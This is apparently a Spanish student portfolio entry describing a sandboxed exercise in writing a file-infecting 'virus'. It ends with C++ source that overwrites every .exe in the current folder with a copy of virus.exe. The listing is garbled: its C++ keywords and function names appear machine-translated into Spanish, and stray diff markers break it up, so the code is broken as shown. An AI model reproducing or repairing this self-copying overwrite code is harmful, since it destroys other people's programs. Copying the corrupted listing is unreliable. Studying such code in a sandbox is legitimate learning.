# Portafolio de evidencias.

## Semana 7.


Lo que aprendí esta semana es hacer una cadena de virus donde cree por primero una carpeta llamada sandbox que no se podrá mover el virus para ello agregue dos de los diferentes códigos ejecutables en versión .exe donde cada uno hacen diferentes usos y diferentes funciones como las siguientes:
  ![image](https://user-images.githubusercontent.com/58115753/187101958-5f2d9060-a5b8-4f38-9f73-173fbeca9b3a.png)
 ![image](https://user-images.githubusercontent.com/58115753/187101970-e06c4ee1-8f15-4e24-8d63-b4769d8bfd7e.png)

En este se muestra el código de ejecutar el volumen de un cuadrado, triangulo entre otros:

 ![image](https://user-images.githubusercontent.com/58115753/187102004-3340b0f9-99be-4d8a-947c-3c8db24f0295.png)

En el siguiente nos muestra un nombre de presentación con edad y genero:
![image](https://user-images.githubusercontent.com/58115753/187102008-f897cc91-5543-40af-8edc-a69b75d57dc7.png)

 
Como se puede observar todos los códigos son iguales ahora se abrirá el archivo creado a igual manera a .exe que como se observa dice soy un virus como el siguiente: 

![image](https://user-images.githubusercontent.com/58115753/187102012-b067393b-a568-40b0-b3a1-2cafbba4c8b1.png)


Haciendo que los demás cuando se ejecute se vean igual:

![image](https://user-images.githubusercontent.com/58115753/187102034-1645c0e8-3d34-441c-9c76-37e04524ac29.png)

![image](https://user-images.githubusercontent.com/58115753/187102041-cd883be7-fec2-43cc-8431-56443314ae5c.png)


 por ultimo una muestra del codigo utilisado:


+#incluir  < iostream >
+# incluir  < fstream >
+# incluir  < cadena.h >
+# include  < dirección.h >
+# incluir  < ventanas.h >
+bool  soloExe (std::string archivo);
+int  principal (){
 +   std::cout<< " Soy un virus \n " ;
 +  std::string nombreArchivos;
  +  DIR *directorio;
   + tipo int ;
    +struct  dirent *elementos;
    +if (directorio= abrirdir ( " . " )){
     +   while (elementos= readdir (directorio))
      +  {
       +     nombreArchivos=elementos-> d_nombre ;
        +    tipo=elementos-> d_tipo ;
         +   if (nombreArchivos!= " .. " && nombreArchivos!= " . " && tipo== 0 && soloExe (nombreArchivos) ){
          +      CopyFile ( " virus.exe " , nombreArchivos.c_str (), false );
           + }
        +}

    +}

    +sistema ( " pausa " );
    +devolver  0 ;
+}
+bool  soloExe (std::string archivo){
 +   if (archivo. substr (archivo. find_last_of ( " . " )+ 1 )== " exe " ){
  +      devolver  verdadero ;
   + } más {
    +    devolver  falso ;
    +}
+}









